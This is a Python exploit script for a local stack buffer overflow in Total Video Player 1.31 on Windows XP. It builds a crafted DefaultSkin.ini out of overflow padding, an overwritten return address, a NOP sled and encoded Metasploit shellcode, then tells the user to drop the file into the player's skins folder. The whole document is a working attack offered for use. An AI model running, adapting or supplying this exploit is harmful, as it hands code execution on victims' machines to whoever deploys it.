#!/usr/bin/python
import socket
print "******************************************************"
print " Total Video Player V1.31 Local Stack Overflow\n"
print " Author: His0k4"
print " Tested on: Windows XP Pro SP2 Fr\n"
print " Greetings to:"
print " All friends & muslims HaCkers(dz)\n"
print " dz-secure.com\n snakespc.com\n dz-security.net"
print "******************************************************"

header1 = (
	"\x5B\x57\x69\x6E\x64\x6F\x77\x73\x5D\x0A\x50\x6C\x69\x73\x74\x57"
	"\x69\x6E\x64\x6F\x77\x20\x3D\x20\x70\x6C\x73\x2E\x64\x6C\x6C\x2C"
	"\x49\x44\x0A\x0A\x5B\x4D\x61\x69\x6E\x57\x69\x6E\x64\x6F\x77\x53"
	"\x43\x52\x45\x45\x4E\x5D\x4D\x61\x69\x6E\x3D\x4E\x6F\x72\x6D\x61"
	"\x6C\x2E\x62\x6D\x70\x0A\x0A\x5B\x50\x6C\x69\x73\x74\x57\x69\x6E"
	"\x64\x6F\x77\x53\x43\x52\x45\x45\x4E\x5D\x0A\x4D\x61\x69\x6E\x3D"
	"\x50\x4C\x42\x75\x74\x74\x6F\x6E\x4E\x6F\x72\x6D\x61\x6C\x2E\x62"
	"\x6D\x70\x0A\x0A\x5B\x50\x6C\x69\x73\x74\x57\x69\x6E\x64\x6F\x77"
	"\x4C\x49\x53\x54\x43\x54\x52\x4C\x53\x54\x59\x4C\x45\x5D\x0A\x43"
	"\x6F\x6C\x75\x6D\x6E\x48\x65\x61\x64\x65\x72\x53\x70\x61\x6E\x3D")

header2=(
	"\x2E\x62\x6D\x70\x0A\x56\x65\x72\x74\x69\x63\x6C\x65\x53\x63\x72"
	"\x6F\x6C\x6C\x42\x61\x72\x54\x68\x75\x6D\x62\x3D\x56\x65\x72\x74"
	"\x69\x63\x6C\x65\x53\x63\x72\x6F\x6C\x6C\x42\x61\x72\x54\x68\x75"
	"\x6D\x62\x2E\x62\x6D\x70")

# win32_exec -  EXITFUNC=seh CMD=calc Size=160 Encoder=PexFnstenvSub http://metasploit.com
shellcode=(
	"\x29\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xd5"
	"\xc5\x35\xef\x83\xeb\xfc\xe2\xf4\x29\x2d\x71\xef\xd5\xc5\xbe\xaa"
	"\xe9\x4e\x49\xea\xad\xc4\xda\x64\x9a\xdd\xbe\xb0\xf5\xc4\xde\xa6"
	"\x5e\xf1\xbe\xee\x3b\xf4\xf5\x76\x79\x41\xf5\x9b\xd2\x04\xff\xe2"
	"\xd4\x07\xde\x1b\xee\x91\x11\xeb\xa0\x20\xbe\xb0\xf1\xc4\xde\x89"
	"\x5e\xc9\x7e\x64\x8a\xd9\x34\x04\x5e\xd9\xbe\xee\x3e\x4c\x69\xcb"
	"\xd1\x06\x04\x2f\xb1\x4e\x75\xdf\x50\x05\x4d\xe3\x5e\x85\x39\x64"
	"\xa5\xd9\x98\x64\xbd\xcd\xde\xe6\x5e\x45\x85\xef\xd5\xc5\xbe\x87"
	"\xe9\x9a\x04\x19\xb5\x93\xbc\x17\x56\x05\x4e\xbf\xbd\x35\xbf\xeb"
	"\x8a\xad\xad\x11\x5f\xcb\x62\x10\x32\xa6\x54\x83\xb6\xc5\x35\xef")
	
buffer = header1 + "\x41"*221 + "\x7C\xE1\xA7\x7C" + "\x90"*20 + shellcode + header2

try:
    out_file = open("DefaultSkin.ini",'w')
    out_file.write(buffer)
    out_file.close()
    print("\n Exploit file created!, Now replace this file in Skins\DefaultSkin folder\n and run the program\n")
except:
    print "Error"

